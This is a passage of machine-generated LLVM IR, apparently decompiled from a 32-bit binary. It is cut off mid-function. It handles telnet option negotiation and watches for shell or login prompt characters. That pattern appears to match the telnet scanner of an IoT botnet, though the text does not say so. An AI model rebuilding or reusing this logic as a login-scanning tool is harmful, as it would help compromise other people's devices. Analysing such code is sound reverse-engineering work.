  %v7_8050a3f = phi i32 [ %v7_8050a3f.pre, %dec_label_pc_8050a3f.preheader ], [ %v9_8050a3f, %dec_label_pc_8050a70 ]
  %v0_8050ce6 = phi i32 [ %v1_8050a36, %dec_label_pc_8050a3f.preheader ], [ %v1_8050a70, %dec_label_pc_8050a70 ]
  %v3_8050a3f = add i32 %v2_8050a3f, %v0_8050ce6
  %v4_8050a3f = inttoptr i32 %v3_8050a3f to i8*
  %v5_8050a3f = load i8, i8* %v4_8050a3f, align 1
  %v6_8050a3f = zext i8 %v5_8050a3f to i32
  %v8_8050a3f = and i32 %v7_8050a3f, -256
  %v9_8050a3f = or i32 %v6_8050a3f, %v8_8050a3f
  store i32 %v9_8050a3f, i32* %edx.global-to-local, align 4
  %v10_8050a43 = icmp eq i8 %v5_8050a3f, 58
  br i1 %v10_8050a43, label %dec_label_pc_8050ce6, label %dec_label_pc_8050a4c

dec_label_pc_8050a4c:                             ; preds = %dec_label_pc_8050a3f
  %v10_8050a4c = icmp eq i8 %v5_8050a3f, 62
  br i1 %v10_8050a4c, label %dec_label_pc_8050ce6, label %dec_label_pc_8050a55

dec_label_pc_8050a55:                             ; preds = %dec_label_pc_8050a4c
  %v10_8050a55 = icmp eq i8 %v5_8050a3f, 36
  br i1 %v10_8050a55, label %dec_label_pc_8050ce6, label %dec_label_pc_8050a5e

dec_label_pc_8050a5e:                             ; preds = %dec_label_pc_8050a55
  %v10_8050a5e = icmp eq i8 %v5_8050a3f, 35
  br i1 %v10_8050a5e, label %dec_label_pc_8050ce6, label %dec_label_pc_8050a67

dec_label_pc_8050a67:                             ; preds = %dec_label_pc_8050a5e
  %v10_8050a67 = icmp eq i8 %v5_8050a3f, 37
  br i1 %v10_8050a67, label %dec_label_pc_8050ce6, label %dec_label_pc_8050a70

dec_label_pc_8050a70:                             ; preds = %dec_label_pc_8050a67
  %v1_8050a70 = add i32 %v0_8050ce6, -1
  %v8_8050a70 = icmp eq i32 %v1_8050a70, 0
  store i32 %v1_8050a70, i32* %eax.global-to-local, align 4
  %v1_8050a71 = icmp eq i1 %v8_8050a70, false
  br i1 %v1_8050a71, label %dec_label_pc_8050a3f, label %dec_label_pc_80505e2.backedge

dec_label_pc_8050a78:                             ; preds = %dec_label_pc_8050683
  %v1_8050a78 = add i32 %v0_8050671, 2
  store i32 %v1_8050a78, i32* @ebx, align 4
  %v1_8050a7b = add i32 %v0_8050a7b, 2
  store i32 %v1_8050a7b, i32* @ebp, align 4
  br label %dec_label_pc_805066d.backedge

dec_label_pc_805066d.backedge:                    ; preds = %dec_label_pc_8050a78, %dec_label_pc_8050e9a
  %v0_80506eb128 = phi i32 [ %v0_80506eb129, %dec_label_pc_8050a78 ], [ %v0_8050ed3, %dec_label_pc_8050e9a ]
  %v1_805066d = phi i32 [ %v1_805067d, %dec_label_pc_8050a78 ], [ %v3_8050ed3, %dec_label_pc_8050e9a ]
  %v0_805066d = phi i32 [ %v1_8050a7b, %dec_label_pc_8050a78 ], [ %v0_805066d.pre, %dec_label_pc_8050e9a ]
  %v5_8050683109 = phi i32 [ %v7_8050683, %dec_label_pc_8050a78 ], [ %v0_8050ecb, %dec_label_pc_8050e9a ]
  %v0_8050676104 = phi i32 [ %v0_8050a90, %dec_label_pc_8050a78 ], [ %v1_8050ed0, %dec_label_pc_8050e9a ]
  %v2_805066d = sub i32 %v0_805066d, %v1_805066d
  %v8_805066d = xor i32 %v0_805066d, %v1_805066d
  %v9_805066d = xor i32 %v2_805066d, %v0_805066d
  %v10_805066d = and i32 %v9_805066d, %v8_805066d
  %v11_805066d = icmp slt i32 %v10_805066d, 0
  %v13_805066d = icmp slt i32 %v2_805066d, 0
  %v2_805066f = icmp eq i1 %v13_805066d, %v11_805066d
  br i1 %v2_805066f, label %dec_label_pc_80506e3, label %dec_label_pc_8050671.preheader

dec_label_pc_8050a83:                             ; preds = %dec_label_pc_8050cf2, %dec_label_pc_80509c6, %dec_label_pc_8050904, %dec_label_pc_8050c79, %dec_label_pc_8050d6b, %dec_label_pc_8050c27, %dec_label_pc_8050bd6, %dec_label_pc_80506e3, %dec_label_pc_8050de4
  %v0_8050a83 = phi i32 [ %v1_8050ce6, %dec_label_pc_8050cf2 ], [ %v1_80509ba160, %dec_label_pc_80509c6 ], [ %v0_80508fb, %dec_label_pc_8050904 ], [ %v1_8050c6d, %dec_label_pc_8050c79 ], [ %v1_8050d5f, %dec_label_pc_8050d6b ], [ %v0_8050c27, %dec_label_pc_8050c27 ], [ %v0_8050bd6, %dec_label_pc_8050bd6 ], [ %v0_80506e3, %dec_label_pc_80506e3 ], [ %v1_8050dd8, %dec_label_pc_8050de4 ]
  %v1_8050a83 = icmp eq i32 %v0_8050a83, 0
  %v1_8050a85 = icmp eq i1 %v1_8050a83, false
  br i1 %v1_8050a85, label %dec_label_pc_8050951, label %dec_label_pc_80505e2.loopexit12.loopexit

dec_label_pc_8050a90:                             ; preds = %dec_label_pc_805068e
  %v1_8050a90 = add i32 %v0_8050a90, 1879
  %v2_8050a90 = inttoptr i32 %v1_8050a90 to i8*
  store i8 -1, i8* %v2_8050a90, align 1
  %v0_8050a98 = load i32, i32* @esp, align 4
  %v1_8050a98 = add i32 %v0_8050a98, 1880
  %v2_8050a98 = inttoptr i32 %v1_8050a98 to i8*
  store i8 -5, i8* %v2_8050a98, align 1
  %v0_8050aa0 = load i32, i32* @esp, align 4
  %v1_8050aa0 = add i32 %v0_8050aa0, 1881
  %v2_8050aa0 = inttoptr i32 %v1_8050aa0 to i8*
  store i8 31, i8* %v2_8050aa0, align 1
  %v0_8050aa8 = load i32, i32* @esp, align 4
  %v1_8050aa8 = add i32 %v0_8050aa8, 1847
  %v2_8050aa8 = inttoptr i32 %v1_8050aa8 to i8*
  store i8 -1, i8* %v2_8050aa8, align 1
  %v0_8050ab0 = load i32, i32* @esp, align 4
  %v1_8050ab0 = add i32 %v0_8050ab0, 1848
  %v2_8050ab0 = inttoptr i32 %v1_8050ab0 to i8*
  store i8 -6, i8* %v2_8050ab0, align 1
  %v0_8050ab8 = load i32, i32* @esp, align 4
  %v1_8050ab8 = add i32 %v0_8050ab8, 1849
  %v2_8050ab8 = inttoptr i32 %v1_8050ab8 to i8*
  store i8 31, i8* %v2_8050ab8, align 1
  %v0_8050ac0 = load i32, i32* @esp, align 4
  %v1_8050ac0 = add i32 %v0_8050ac0, 1850
  %v2_8050ac0 = inttoptr i32 %v1_8050ac0 to i8*
  store i8 0, i8* %v2_8050ac0, align 1
  %v0_8050ac8 = load i32, i32* @esp, align 4
  %v1_8050ac8 = add i32 %v0_8050ac8, 1851
  %v2_8050ac8 = inttoptr i32 %v1_8050ac8 to i8*
  store i8 80, i8* %v2_8050ac8, align 1
  %v0_8050ad0 = load i32, i32* @esp, align 4
  %v1_8050ad0 = add i32 %v0_8050ad0, 1852
  %v2_8050ad0 = inttoptr i32 %v1_8050ad0 to i8*
  store i8 0, i8* %v2_8050ad0, align 1
  %v0_8050ad8 = load i32, i32* @esp, align 4
  %v1_8050ad8 = add i32 %v0_8050ad8, 1853
  %v2_8050ad8 = inttoptr i32 %v1_8050ad8 to i8*
  store i8 24, i8* %v2_8050ad8, align 1
  %v0_8050ae0 = load i32, i32* @esp, align 4
  %v1_8050ae0 = add i32 %v0_8050ae0, 1854
  %v2_8050ae0 = inttoptr i32 %v1_8050ae0 to i8*
  store i8 -1, i8* %v2_8050ae0, align 1
  %v0_8050ae8 = load i32, i32* @esp, align 4
  %v1_8050ae8 = add i32 %v0_8050ae8, 1855
  %v2_8050ae8 = inttoptr i32 %v1_8050ae8 to i8*
  store i8 -16, i8* %v2_8050ae8, align 1
  %v0_8050af0 = load i32, i32* @esp, align 4
  %v1_8050af0 = add i32 %v0_8050af0, 16
  %v2_8050af0 = inttoptr i32 %v1_8050af0 to i32*
  %v3_8050af0 = load i32, i32* %v2_8050af0, align 4
  store i32 %v3_8050af0, i32* %eax.global-to-local, align 4
  %v0_8050af4 = load i32, i32* @edi, align 4
  %v1_8050af4 = add i32 %v0_8050af4, 24
  %v2_8050af4 = inttoptr i32 %v1_8050af4 to i32*
  %v3_8050af4 = load i32, i32* %v2_8050af4, align 4
  store i32 %v3_8050af4, i32* %ecx.global-to-local, align 4
  %v0_8050af7 = load i32, i32* @ebx, align 4
  %v1_8050af7 = add i32 %v0_8050af7, 2
  store i32 %v1_8050af7, i32* %edx.global-to-local, align 4
  %v2_8050afa = add i32 %v3_8050af4, %v3_8050af0
  store i32 %v2_8050afa, i32* %eax.global-to-local, align 4
  %tmp299 = icmp ugt i32 %v2_8050afa, %v1_8050af7
  br i1 %tmp299, label %dec_label_pc_8050b04, label %dec_label_pc_8050a90.dec_label_pc_80506e3.loopexit_crit_edge

dec_label_pc_8050a90.dec_label_pc_80506e3.loopexit_crit_edge: ; preds = %dec_label_pc_8050a90
  %v0_80506e3.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80506e3

dec_label_pc_8050b04:                             ; preds = %dec_label_pc_8050a90
  %v2_8050b04 = inttoptr i32 %v1_8050af7 to i8*
  %v3_8050b04 = load i8, i8* %v2_8050b04, align 1
  %v12_8050b04 = icmp eq i8 %v3_8050b04, 31
  br i1 %v12_8050b04, label %dec_label_pc_8050e9a, label %dec_label_pc_8050b0e

dec_label_pc_8050b0e:                             ; preds = %dec_label_pc_8050b04
  %v1_8050b0e = inttoptr i32 %v0_8050af7 to i8*
  %v2_8050b0e = load i8, i8* %v1_8050b0e, align 1
  %v3_8050b0e = zext i8 %v2_8050b0e to i32
  %v5_8050b0e = and i32 %v2_8050afa, -256
  %v6_8050b0e = or i32 %v3_8050b0e, %v5_8050b0e
  store i32 %v6_8050b0e, i32* %eax.global-to-local, align 4
  %v11_8050b10 = icmp eq i8 %v2_8050b0e, -3
  %v1_8050b12 = icmp eq i1 %v11_8050b10, false
  br i1 %v1_8050b12, label %dec_label_pc_8051063, label %dec_label_pc_8050b18

dec_label_pc_8050b18:                             ; preds = %dec_label_pc_8050b0e
  store i8 -4, i8* %v1_8050b0e, align 1
  %v0_8050b1b = load i32, i32* @esi, align 4
  %v1_8050b1b = inttoptr i32 %v0_8050b1b to i8*
  %v2_8050b1b = load i8, i8* %v1_8050b1b, align 1
  %v3_8050b1b = zext i8 %v2_8050b1b to i32
  %v4_8050b1b = load i32, i32* %eax.global-to-local, align 4
  %v5_8050b1b = and i32 %v4_8050b1b, -256
  %v6_8050b1b = or i32 %v5_8050b1b, %v3_8050b1b
  store i32 %v6_8050b1b, i32* %eax.global-to-local, align 4
  %v11_8050b1d = icmp eq i8 %v2_8050b1b, -3
  %v1_8050b1f = icmp eq i1 %v11_8050b1d, false
  br i1 %v1_8050b1f, label %dec_label_pc_80506a7, label %dec_label_pc_8050b25

dec_label_pc_8050b25:                             ; preds = %dec_label_pc_8050b18, %dec_label_pc_805069d
  %v0_8050b25 = phi i32 [ %v0_8050b1b, %dec_label_pc_8050b18 ], [ %v0_805069d, %dec_label_pc_805069d ]
  %v1_8050b25 = inttoptr i32 %v0_8050b25 to i8*
  store i8 -4, i8* %v1_8050b25, align 1
  %v0_8050b28 = load i32, i32* @ebx, align 4
  %v1_8050b28 = add i32 %v0_8050b28, 2
  %v2_8050b28 = inttoptr i32 %v1_8050b28 to i8*
  %v3_8050b28 = load i8, i8* %v2_8050b28, align 1
  %v4_8050b28 = zext i8 %v3_8050b28 to i32
  %v5_8050b28 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050b28 = and i32 %v5_8050b28, -256
  %v7_8050b28 = or i32 %v6_8050b28, %v4_8050b28
  store i32 %v7_8050b28, i32* %eax.global-to-local, align 4
  %v11_8050b2b = icmp eq i8 %v3_8050b28, -3
  %v1_8050b2d = icmp eq i1 %v11_8050b2b, false
  br i1 %v1_8050b2d, label %dec_label_pc_80506ba, label %dec_label_pc_8050b33

dec_label_pc_8050b33:                             ; preds = %dec_label_pc_8050b25, %dec_label_pc_80506af
  %v0_8050b33 = phi i32 [ %v0_8050b28, %dec_label_pc_8050b25 ], [ %v0_80506af, %dec_label_pc_80506af ]
  %v1_8050b33 = add i32 %v0_8050b33, 2
  %v2_8050b33 = inttoptr i32 %v1_8050b33 to i8*
  store i8 -4, i8* %v2_8050b33, align 1
  br label %dec_label_pc_80506c2

dec_label_pc_8050b3c:                             ; preds = %dec_label_pc_80505fd
  %v1_805062a = icmp eq i32 %v0_8050622, 0
  br i1 %v1_805062a, label %dec_label_pc_8051048, label %dec_label_pc_8050b42

dec_label_pc_8050b42:                             ; preds = %dec_label_pc_8050b3c
  %v10_8050b42 = icmp eq i32 %v0_8050622, -1
  %v1_8050b45 = icmp eq i1 %v10_8050b42, false
  br i1 %v1_8050b45, label %dec_label_pc_8050644, label %dec_label_pc_8050b4b

dec_label_pc_8050b4b:                             ; preds = %dec_label_pc_8050b42
  %v1_8050b4b = add i32 %v0_8050627, 56
  %v2_8050b4b = inttoptr i32 %v1_8050b4b to i32*
  %v3_8050b4b = load i32, i32* %v2_8050b4b, align 4
  store i32 %v3_8050b4b, i32* %edx.global-to-local, align 4
  %v1_8050b4f = inttoptr i32 %v3_8050b4b to i32*
  %v2_8050b4f = load i32, i32* %v1_8050b4f, align 4
  %v11_8050b4f = icmp eq i32 %v2_8050b4f, 11
  br i1 %v11_8050b4f, label %dec_label_pc_805058b, label %dec_label_pc_8050b58

dec_label_pc_8050b58:                             ; preds = %dec_label_pc_8050b4b, %dec_label_pc_8051048
  %v0_8050b58 = phi i32 [ %v1_8050627, %dec_label_pc_8050b4b ], [ %v0_8050b58.pre, %dec_label_pc_8051048 ]
  %v0_8050b5b = load i32, i32* @edi, align 4
  %v1_8050b5b = add i32 %v0_8050b5b, 4
  %v2_8050b5b = inttoptr i32 %v1_8050b5b to i32*
  %v3_8050b5b = load i32, i32* %v2_8050b5b, align 4
  store i32 %v3_8050b5b, i32* @esi, align 4
  %v2_8050b5e = add i32 %v0_8050b58, -16
  %v3_8050b5e = inttoptr i32 %v2_8050b5e to i32*
  store i32 %v3_8050b5b, i32* %v3_8050b5e, align 4
  %v1_8050b5f = call i32 @function_80521f1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050b5f, i32* %eax.global-to-local, align 4
  %v0_8050b64 = load i32, i32* @edi, align 4
  %v1_8050b64 = add i32 %v0_8050b64, 284
  %v2_8050b64 = inttoptr i32 %v1_8050b64 to i8*
  %v3_8050b64 = load i8, i8* %v2_8050b64, align 1
  %v4_8050b64 = zext i8 %v3_8050b64 to i32
  %v6_8050b64 = and i32 %v1_8050b5f, -256
  %v7_8050b64 = or i32 %v4_8050b64, %v6_8050b64
  %v1_8050b6d = add i32 %v7_8050b64, 1
  store i32 %v1_8050b6d, i32* %eax.global-to-local, align 4
  %v1_8050b6e = add i32 %v0_8050b64, 4
  %v2_8050b6e = inttoptr i32 %v1_8050b6e to i32*
  store i32 -1, i32* %v2_8050b6e, align 4
  %v0_8050b75 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b75 = trunc i32 %v0_8050b75 to i8
  %v2_8050b75 = load i32, i32* @edi, align 4
  %v3_8050b75 = add i32 %v2_8050b75, 284
  %v4_8050b75 = inttoptr i32 %v3_8050b75 to i8*
  store i8 %v1_8050b75, i8* %v4_8050b75, align 1
  %v0_8050b7b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b7b = trunc i32 %v0_8050b7b to i8
  %tmp300 = icmp ult i8 %v1_8050b7b, 10
  %v0_8051057 = load i32, i32* @edi, align 4
  br i1 %tmp300, label %dec_label_pc_8051057, label %dec_label_pc_8050b83

dec_label_pc_8050b83:                             ; preds = %dec_label_pc_8050b58
  %v1_8050b83 = add i32 %v0_8051057, 284
  %v2_8050b83 = inttoptr i32 %v1_8050b83 to i8*
  store i8 0, i8* %v2_8050b83, align 1
  %v0_8050b8a = load i32, i32* @edi, align 4
  %v1_8050b8a = add i32 %v0_8050b8a, 12
  %v2_8050b8a = inttoptr i32 %v1_8050b8a to i32*
  store i32 0, i32* %v2_8050b8a, align 4
  br label %dec_label_pc_805058b

dec_label_pc_8050b96:                             ; preds = %dec_label_pc_80506a7
  %v1_8050b96 = inttoptr i32 %v0_8050b96 to i8*
  store i8 -3, i8* %v1_8050b96, align 1
  %v5_80506af.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506af

dec_label_pc_8050b9e:                             ; preds = %dec_label_pc_80506ba
  %v1_8050b9e = add i32 %v0_8050b9e, 2
  %v2_8050b9e = inttoptr i32 %v1_8050b9e to i8*
  store i8 -3, i8* %v2_8050b9e, align 1
  br label %dec_label_pc_80506c2

dec_label_pc_8050ba7:                             ; preds = %dec_label_pc_80505e9
  %v0_8050ba7 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050ba7, i32* %edx.global-to-local, align 4
  %v1_8050ba9 = load i32, i32* @esp, align 4
  %v2_8050ba9 = add i32 %v1_8050ba9, -4
  %v3_8050ba9 = inttoptr i32 %v2_8050ba9 to i32*
  store i32 %v0_8050ba7, i32* %v3_8050ba9, align 4
  %v0_8050baa = load i32, i32* @edi, align 4
  %v1_8050baa = add i32 %v0_8050baa, 92
  store i32 %v1_8050baa, i32* %eax.global-to-local, align 4
  %v1_8050bad = add i32 %v1_8050ba9, -8
  %v2_8050bad = inttoptr i32 %v1_8050bad to i32*
  store i32 192, i32* %v2_8050bad, align 4
  %v0_8050bb2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050bb2 = add i32 %v1_8050ba9, -12
  %v3_8050bb2 = inttoptr i32 %v2_8050bb2 to i32*
  store i32 %v0_8050bb2, i32* %v3_8050bb2, align 4
  %v0_8050bb3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050bb3 = add i32 %v1_8050ba9, -16
  %v3_8050bb3 = inttoptr i32 %v2_8050bb3 to i32*
  store i32 %v0_8050bb3, i32* %v3_8050bb3, align 4
  %v4_8050bb4 = call i32 @function_8052753(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050bb4, i32* %eax.global-to-local, align 4
  %v0_8050bb9 = load i32, i32* @edi, align 4
  %v1_8050bb9 = add i32 %v0_8050bb9, 24
  %v2_8050bb9 = inttoptr i32 %v1_8050bb9 to i32*
  %v3_8050bb9 = load i32, i32* %v2_8050bb9, align 4
  %v1_8050bbc = add i32 %v3_8050bb9, -64
  store i32 %v1_8050bbc, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bbc, i32* %v2_8050bb9, align 4
  br label %dec_label_pc_80505fd

dec_label_pc_8050bca:                             ; preds = %dec_label_pc_8050729, %dec_label_pc_8050720, %dec_label_pc_8050717, %dec_label_pc_805070e, %dec_label_pc_8050701
  %v1_8050bca = add i32 %v0_8050bca, 1
  store i32 %v1_8050bca, i32* @ebp, align 4
  %v10_8050bcd = icmp eq i32 %v0_8050bca, -2
  br i1 %v10_8050bcd, label %dec_label_pc_8050735, label %dec_label_pc_8050bd6

dec_label_pc_8050bd6:                             ; preds = %dec_label_pc_8050bca, %dec_label_pc_8050755, %dec_label_pc_8050735
  %v0_8050bd6 = phi i32 [ %v1_8050bca, %dec_label_pc_8050bca ], [ %v0_8050765, %dec_label_pc_8050755 ], [ %v0_8050742, %dec_label_pc_8050735 ]
  %tmp148 = icmp slt i32 %v0_8050bd6, 1
  br i1 %tmp148, label %dec_label_pc_8050a83, label %dec_label_pc_8050bde

dec_label_pc_8050bde:                             ; preds = %dec_label_pc_8050bd6
  %v0_8050bde = load i32, i32* @edi, align 4
  %v1_8050bde = inttoptr i32 %v0_8050bde to i32*
  %v2_8050bde = load i32, i32* %v1_8050bde, align 4
  store i32 %v2_8050bde, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050be2 = load i32, i32* @esp, align 4
  %v1_8050be2 = add i32 %v0_8050be2, -4
  %v2_8050be2 = inttoptr i32 %v1_8050be2 to i32*
  store i32 16384, i32* %v2_8050be2, align 4
  %v0_8050be7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050be7 = add i32 %v0_8050be7, 12
  %v2_8050be7 = inttoptr i32 %v1_8050be7 to i8*
  %v3_8050be7 = load i8, i8* %v2_8050be7, align 1
  %v4_8050be7 = zext i8 %v3_8050be7 to i32
  %v5_8050be7 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050be7 = and i32 %v5_8050be7, -256
  %v7_8050be7 = or i32 %v6_8050be7, %v4_8050be7
  store i32 %v7_8050be7, i32* %eax.global-to-local, align 4
  %v2_8050bea = add i32 %v0_8050be2, -8
  %v3_8050bea = inttoptr i32 %v2_8050bea to i32*
  store i32 %v7_8050be7, i32* %v3_8050bea, align 4
  %v0_8050beb = load i32, i32* %edx.global-to-local, align 4
  %v1_8050beb = inttoptr i32 %v0_8050beb to i32*
  %v2_8050beb = load i32, i32* %v1_8050beb, align 4
  store i32 %v2_8050beb, i32* %eax.global-to-local, align 4
  %v2_8050bed = add i32 %v0_8050be2, -12
  %v3_8050bed = inttoptr i32 %v2_8050bed to i32*
  store i32 %v2_8050beb, i32* %v3_8050bed, align 4
  %v0_8050bee = load i32, i32* @edi, align 4
  %v1_8050bee = add i32 %v0_8050bee, 4
  %v2_8050bee = inttoptr i32 %v1_8050bee to i32*
  %v3_8050bee = load i32, i32* %v2_8050bee, align 4
  store i32 %v3_8050bee, i32* %eax.global-to-local, align 4
  %v2_8050bf1 = add i32 %v0_8050be2, -16
  %v3_8050bf1 = inttoptr i32 %v2_8050bf1 to i32*
  store i32 %v3_8050bee, i32* %v3_8050bf1, align 4
  %v0_8050bf2 = call i32 @function_8052934()
  store i32 %v0_8050bf2, i32* %eax.global-to-local, align 4
  %v0_8050bf7 = load i32, i32* @esp, align 4
  %v1_8050bf7 = add i32 %v0_8050bf7, -4
  %v2_8050bf7 = inttoptr i32 %v1_8050bf7 to i32*
  store i32 16384, i32* %v2_8050bf7, align 4
  %v1_8050bfc = add i32 %v0_8050bf7, -8
  %v2_8050bfc = inttoptr i32 %v1_8050bfc to i32*
  store i32 2, i32* %v2_8050bfc, align 4
  %v1_8050bfe = add i32 %v0_8050bf7, -12
  %v2_8050bfe = inttoptr i32 %v1_8050bfe to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8050bfe, align 4
  %v0_8050c03 = load i32, i32* @edi, align 4
  %v1_8050c03 = add i32 %v0_8050c03, 4
  %v2_8050c03 = inttoptr i32 %v1_8050c03 to i32*
  %v3_8050c03 = load i32, i32* %v2_8050c03, align 4
  store i32 %v3_8050c03, i32* %eax.global-to-local, align 4
  %v2_8050c06 = add i32 %v0_8050bf7, -16
  %v3_8050c06 = inttoptr i32 %v2_8050c06 to i32*
  store i32 %v3_8050c03, i32* %v3_8050c06, align 4
  %v0_8050c07 = call i32 @function_8052934()
  store i32 %v0_8050c07, i32* %eax.global-to-local, align 4
  %v0_8050c0f = load i32, i32* @edi, align 4
  %v1_8050c0f = add i32 %v0_8050c0f, 12
  %v2_8050c0f = inttoptr i32 %v1_8050c0f to i32*
  store i32 4, i32* %v2_8050c0f, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050c1b:                             ; preds = %dec_label_pc_80507a9, %dec_label_pc_80507a0, %dec_label_pc_8050797, %dec_label_pc_805078a
  %v1_8050c1b = add i32 %v0_8050c1b, 1
  store i32 %v1_8050c1b, i32* @ebp, align 4
  %v10_8050c1e = icmp eq i32 %v0_8050c1b, -2
  br i1 %v10_8050c1e, label %dec_label_pc_80507b5, label %dec_label_pc_8050c27

dec_label_pc_8050c27:                             ; preds = %dec_label_pc_8050c1b, %dec_label_pc_80507b5
  %v0_8050c27 = phi i32 [ %v1_8050c1b, %dec_label_pc_8050c1b ], [ %v0_80507c2, %dec_label_pc_80507b5 ]
  %tmp149 = icmp slt i32 %v0_8050c27, 1
  br i1 %tmp149, label %dec_label_pc_8050a83, label %dec_label_pc_8050c2f

dec_label_pc_8050c2f:                             ; preds = %dec_label_pc_8050c27
  %v0_8050c2f = load i32, i32* @edi, align 4
  %v1_8050c2f = inttoptr i32 %v0_8050c2f to i32*
  %v2_8050c2f = load i32, i32* %v1_8050c2f, align 4
  store i32 %v2_8050c2f, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050c33 = load i32, i32* @esp, align 4
  %v1_8050c33 = add i32 %v0_8050c33, -4
  %v2_8050c33 = inttoptr i32 %v1_8050c33 to i32*
  store i32 16384, i32* %v2_8050c33, align 4
  %v0_8050c38 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c38 = add i32 %v0_8050c38, 13
  %v2_8050c38 = inttoptr i32 %v1_8050c38 to i8*
  %v3_8050c38 = load i8, i8* %v2_8050c38, align 1
  %v4_8050c38 = zext i8 %v3_8050c38 to i32
  %v5_8050c38 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050c38 = and i32 %v5_8050c38, -256
  %v7_8050c38 = or i32 %v6_8050c38, %v4_8050c38
  store i32 %v7_8050c38, i32* %eax.global-to-local, align 4
  %v2_8050c3b = add i32 %v0_8050c33, -8
  %v3_8050c3b = inttoptr i32 %v2_8050c3b to i32*
  store i32 %v7_8050c38, i32* %v3_8050c3b, align 4
  %v0_8050c3c = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c3c = add i32 %v0_8050c3c, 4
  %v2_8050c3c = inttoptr i32 %v1_8050c3c to i32*
  %v3_8050c3c = load i32, i32* %v2_8050c3c, align 4
  store i32 %v3_8050c3c, i32* @esi, align 4
  %v2_8050c3f = add i32 %v0_8050c33, -12
  %v3_8050c3f = inttoptr i32 %v2_8050c3f to i32*
  store i32 %v3_8050c3c, i32* %v3_8050c3f, align 4
  %v0_8050c40 = load i32, i32* @edi, align 4
  %v1_8050c40 = add i32 %v0_8050c40, 4
  %v2_8050c40 = inttoptr i32 %v1_8050c40 to i32*
  %v3_8050c40 = load i32, i32* %v2_8050c40, align 4
  store i32 %v3_8050c40, i32* @ebx, align 4
  %v2_8050c43 = add i32 %v0_8050c33, -16
  %v3_8050c43 = inttoptr i32 %v2_8050c43 to i32*
  store i32 %v3_8050c40, i32* %v3_8050c43, align 4
  %v0_8050c44 = call i32 @function_8052934()
  store i32 %v0_8050c44, i32* %eax.global-to-local, align 4
  %v0_8050c49 = load i32, i32* @esp, align 4
  %v1_8050c49 = add i32 %v0_8050c49, -4
  %v2_8050c49 = inttoptr i32 %v1_8050c49 to i32*
  store i32 16384, i32* %v2_8050c49, align 4
  %v1_8050c4e = add i32 %v0_8050c49, -8
  %v2_8050c4e = inttoptr i32 %v1_8050c4e to i32*
  store i32 2, i32* %v2_8050c4e, align 4
  %v1_8050c50 = add i32 %v0_8050c49, -12
  %v2_8050c50 = inttoptr i32 %v1_8050c50 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8050c50, align 4
  %v0_8050c55 = load i32, i32* @edi, align 4
  %v1_8050c55 = add i32 %v0_8050c55, 4
  %v2_8050c55 = inttoptr i32 %v1_8050c55 to i32*
  %v3_8050c55 = load i32, i32* %v2_8050c55, align 4
  store i32 %v3_8050c55, i32* %ecx.global-to-local, align 4
  %v2_8050c58 = add i32 %v0_8050c49, -16
  %v3_8050c58 = inttoptr i32 %v2_8050c58 to i32*
  store i32 %v3_8050c55, i32* %v3_8050c58, align 4
  %v0_8050c59 = call i32 @function_8052934()
  store i32 %v0_8050c59, i32* %eax.global-to-local, align 4
  %v0_8050c61 = load i32, i32* @edi, align 4
  %v1_8050c61 = add i32 %v0_8050c61, 12
  %v2_8050c61 = inttoptr i32 %v1_8050c61 to i32*
  store i32 5, i32* %v2_8050c61, align 4
  br label %dec_label_pc_8050951

dec_label_pc_8050c6d:                             ; preds = %dec_label_pc_8050859, %dec_label_pc_8050850, %dec_label_pc_8050847, %dec_label_pc_805083e, %dec_label_pc_8050831
  %v1_8050c6d = add i32 %v0_8050c6d, 1
  store i32 %v1_8050c6d, i32* @ebp, align 4
  %v10_8050c70 = icmp eq i32 %v0_8050c6d, -2
  br i1 %v10_8050c70, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_8050c79

dec_label_pc_8050c79:                             ; preds = %dec_label_pc_8050c6d
  %tmp150 = icmp slt i32 %v1_8050c6d, 1
  br i1 %tmp150, label %dec_label_pc_8050a83, label %dec_label_pc_8050c81

dec_label_pc_8050c81:                             ; preds = %dec_label_pc_8050c79
  %v0_8050c81 = load i32, i32* @esp, align 4
  %v1_8050c84 = add i32 %v0_8050c81, -16
  %v2_8050c84 = inttoptr i32 %v1_8050c84 to i32*
  store i32 22, i32* %v2_8050c84, align 4
  %v2_8050c86 = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050c86, i32* %eax.global-to-local, align 4
  %v0_8050c8b = load i32, i32* @esp, align 4
  %v1_8050c8b = inttoptr i32 %v0_8050c8b to i32*
  %v2_8050c8b = load i32, i32* %v1_8050c8b, align 4
  store i32 %v2_8050c8b, i32* %eax.global-to-local, align 4
  %v3_8050c8b = add i32 %v0_8050c8b, 4
  %v1_8050c8c = inttoptr i32 %v3_8050c8b to i32*
  %v2_8050c8c = load i32, i32* %v1_8050c8c, align 4
  store i32 %v2_8050c8c, i32* %edx.global-to-local, align 4
  %v1_8050c8d = add i32 %v0_8050c8b, 1888
  store i32 %v1_8050c8d, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c8d, i32* %v1_8050c8c, align 4
  store i32 22, i32* %v1_8050c8b, align 4
  %v3_8050c97 = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
